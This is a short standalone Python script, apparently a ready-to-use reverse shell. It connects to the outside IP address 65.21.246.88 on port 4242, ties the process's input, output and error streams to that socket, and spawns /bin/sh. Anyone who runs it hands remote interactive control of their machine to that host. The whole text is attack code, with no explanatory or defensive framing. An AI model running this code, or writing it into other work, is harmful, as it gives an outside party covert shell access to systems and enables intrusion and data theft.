import socket
import os
import pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("65.21.246.88",4242))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
